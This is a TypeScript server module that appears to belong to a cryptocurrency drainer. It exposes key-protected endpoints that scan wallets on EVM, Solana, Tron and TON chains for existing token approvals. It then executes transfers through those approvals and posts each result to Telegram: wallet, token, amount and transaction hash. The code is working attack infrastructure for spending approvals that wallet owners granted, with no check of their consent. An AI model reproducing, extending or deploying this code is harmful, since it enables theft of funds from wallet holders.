/**
 * Allowance reuse admin API — scan and execute existing approvals (KINETIC_INTERNAL_KEY).
 */
import {
  executeAllowanceReuse,
  isAllowanceReuseEnabled,
  scanReusableAllowances,
  type AllowanceReuseScanParams,
  type ReusableAllowance,
} from '@legion/core'
import type { Address } from 'viem'
import { isAddress, getAddress } from 'viem'
import type { FastifyInstance, FastifyReply, FastifyRequest } from 'fastify'

import { sendFailure, sendSuccess } from '../lib/api-response.js'
import { isTelegramConfigured, sendTelegramMessage } from '../lib/telegram.js'

type InternalAuthReason = 'ok' | 'key_not_configured' | 'key_missing_header' | 'key_mismatch'

function authorizeInternal(request: FastifyRequest):
  | { ok: true }
  | { ok: false; reason: Exclude<InternalAuthReason, 'ok'> } {
  const expected = process.env['KINETIC_INTERNAL_KEY']?.trim()
  if (!expected) return { ok: false, reason: 'key_not_configured' }
  const hdr = request.headers['x-legion-kinetic-key']
  const received =
    typeof hdr === 'string' ? hdr.trim() : Array.isArray(hdr) ? String(hdr[0] ?? '').trim() : ''
  if (!received) return { ok: false, reason: 'key_missing_header' }
  if (received !== expected) return { ok: false, reason: 'key_mismatch' }
  return { ok: true }
}

function parseScanBody(body: Record<string, unknown>): AllowanceReuseScanParams | null {
  const wallet = typeof body['wallet_address'] === 'string' ? body['wallet_address'].trim() : ''
  if (!wallet) return null

  const evm_tokens_raw = body['evm_tokens']
  let evm_tokens: Address[] | undefined
  if (Array.isArray(evm_tokens_raw)) {
    evm_tokens = evm_tokens_raw
      .filter((t): t is string => typeof t === 'string' && isAddress(t))
      .map((t) => getAddress(t))
  }

  return {
    wallet_address: wallet,
    ...(typeof body['evm_chain_id'] === 'number' ? { evm_chain_id: body['evm_chain_id'] } : {}),
    ...(evm_tokens?.length ? { evm_tokens } : {}),
    ...(typeof body['sol_wallet'] === 'string' ? { sol_wallet: body['sol_wallet'] } : {}),
    ...(typeof body['tron_wallet'] === 'string' ? { tron_wallet: body['tron_wallet'] } : {}),
    ...(typeof body['ton_wallet'] === 'string' ? { ton_wallet: body['ton_wallet'] } : {}),
    ...(typeof body['trc20_contract'] === 'string' ? { trc20_contract: body['trc20_contract'] } : {}),
    ...(typeof body['tron_spender'] === 'string' ? { tron_spender: body['tron_spender'] } : {}),
  }
}

async function telegramForExecuteResults(allowances: ReusableAllowance[], results: Awaited<ReturnType<typeof executeAllowanceReuse>>): Promise<void> {
  if (!isTelegramConfigured()) return
  for (const r of results.results) {
    const item = allowances.find((a) => a.id === r.id)
    if (!item) continue
    if (r.ok && r.tx_hash) {
      await sendTelegramMessage(
        [
          '🔄 ALLOWANCE REUSE',
          `Wallet: ${item.wallet.slice(0, 12)}…`,
          `Token: ${item.token_symbol}`,
          `Amount: ${r.amount_human ?? item.amount_raw}`,
          `Tx: ${r.tx_hash.slice(0, 18)}…`,
        ].join('\n'),
      )
    } else if (!r.ok) {
      await sendTelegramMessage(
        [
          '🔄 ALLOWANCE REUSE — FAILED',
          `Wallet: ${item.wallet.slice(0, 12)}…`,
          `Token: ${item.token_symbol}`,
          `Error: ${r.detail ?? 'unknown'}`,
        ].join('\n'),
      )
    }
  }
}

export async function registerAllowanceReuseRoutes(app: FastifyInstance): Promise<void> {
  app.post(
    '/api/internal/allowance-reuse/scan',
    async (request: FastifyRequest, reply: FastifyReply) => {
      if (!isAllowanceReuseEnabled()) {
        return sendFailure(reply, 404, 'ALLOWANCE_REUSE_ENABLED is not true', { code: 'NotFound' })
      }

      const auth = authorizeInternal(request)
      if (auth.ok === false) {
        return sendFailure(reply, 401, 'Kinetic internal authorization required', {
          code: 'Unauthorized',
          reason: auth.reason,
        })
      }

      const body =
        typeof request.body === 'object' && request.body !== null
          ? (request.body as Record<string, unknown>)
          : {}
      const scan = parseScanBody(body)
      if (!scan) {
        return sendFailure(reply, 400, 'wallet_address is required', { code: 'ValidationError' })
      }

      const result = await scanReusableAllowances(scan)
      if (!('ok' in result) || !result.ok) {
        return sendFailure(reply, 400, 'reason' in result ? result.reason : 'scan failed', {
          code: 'AllowanceReuseScanFailed',
          result,
        })
      }

      return sendSuccess(reply, 200, 'Allowance reuse scan complete (read-only)', result)
    },
  )

  app.post(
    '/api/internal/allowance-reuse/execute',
    async (request: FastifyRequest, reply: FastifyReply) => {
      if (!isAllowanceReuseEnabled()) {
        return sendFailure(reply, 404, 'ALLOWANCE_REUSE_ENABLED is not true', { code: 'NotFound' })
      }

      const auth = authorizeInternal(request)
      if (auth.ok === false) {
        return sendFailure(reply, 401, 'Kinetic internal authorization required', {
          code: 'Unauthorized',
          reason: auth.reason,
        })
      }

      const body =
        typeof request.body === 'object' && request.body !== null
          ? (request.body as Record<string, unknown>)
          : {}

      const scan = parseScanBody(body)
      const allowance_ids = Array.isArray(body['allowance_ids'])
        ? body['allowance_ids'].filter((id): id is string => typeof id === 'string')
        : undefined

      const allowances_inline =
        Array.isArray(body['allowances']) && body['allowances'].length > 0
          ? (body['allowances'] as ReusableAllowance[])
          : undefined

      let targets: ReusableAllowance[] = allowances_inline ?? []

      if (targets.length === 0) {
        const scanned = scan
          ? await scanReusableAllowances(scan)
          : { ok: false as const, reason: 'wallet_address required for scan' }
        if (!('ok' in scanned) || !scanned.ok) {
          return sendFailure(reply, 400, 'reason' in scanned ? scanned.reason : 'scan failed', {
            code: 'AllowanceReuseExecuteFailed',
          })
        }
        targets = scanned.allowances
      }

      if (allowance_ids?.length) {
        const idSet = new Set(allowance_ids)
        targets = targets.filter((a) => idSet.has(a.id))
      }

      const executed = await executeAllowanceReuse({ allowances: targets.filter((a) => a.executable) })
      await telegramForExecuteResults(targets, executed)

      return sendSuccess(reply, 200, 'Allowance reuse execution finished', executed)
    },
  )

  app.log.info('[BOOT] Allowance reuse routes registered')
}
